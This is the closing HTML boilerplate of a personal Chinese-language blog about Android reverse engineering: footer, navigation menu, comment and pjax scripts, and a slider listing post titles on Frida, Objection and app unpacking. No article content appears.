href="#Attack%E5%AE%9E%E7%8E%B0"><span class="toc-text">Attack实现</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><!--a(href='/posts/eec9786.html') 魔改指南--><a href="/personal/bb/">我的唠叨</a><a href="/box/nav/">网址导航</a></li><li><a href="/social/link/">我的朋友</a><a href="/comments/">留点什么</a></li><li><a href="/personal/about/">关于作者</a><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a><a href="/tags/">文章标签</a></li><li><!--a(href='/box/Gallery/') 我的画廊--><!--a(href='/personal/bb/') 我的唠叨--></li><li><!--a(href='/site/time/') 建设进程--><!--a(href='/site/census/') 网站统计--></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链⌛</p><div class="ft-img-group"><div class="img-group-item"><a href="https://zxk1ng.github.io/" title="zxk1ng"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/img.png" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2022-2025</b></span><span><b>&nbsp;&nbsp;By zxk1ng</b></span></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="右键模式" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="分享链接" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>百度搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>关于博客</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>美化设置</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>切换全屏</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>打印页面</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: '',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: '',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_3586335_hsivh70x0fm.js"></script><script async src="//at.alicdn.com/t/c/font_3636804_gr02jmjr3y9.js"></script><script async src="//at.alicdn.com/t/c/font_3612150_kfv55xn3u2g.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Android抓包/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍡 小ZのAndroid抓包记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Android逆向/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍼 小ZのAndroid逆向记录 (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/NDK开发/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍉 小ZのNDK开发记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/移动安全/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍟 小Zの移动安全记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/阅读/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍨 小Zの阅读记录 (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/脱壳/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍥 小Zの脱壳记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://zxk1ng.github.io/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
    console.log('已挂载magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Android抓包/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍡 小ZのAndroid抓包记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Android逆向/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍼 小ZのAndroid逆向记录 (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/NDK开发/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍉 小ZのNDK开发记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/移动安全/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍟 小Zの移动安全记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/阅读/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍨 小Zの阅读记录 (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/脱壳/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍥 小Zの脱壳记录 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://zxk1ng.github.io/categories/" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
    console.log('已挂载magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt="">《第一行代码》阅读笔记</a><div class="blog-slider__text">🍓阅读《第一行代码》记录的一些小东西</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt="">刷机与脱壳机入门</a><div class="blog-slider__text">🐱刷机与部分脱壳机、脱壳点的入门学习</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt="">frida与Objection</a><div class="blog-slider__text">🥝frida与objection基本操作整理与归纳</div><a class="blog-slider__button" 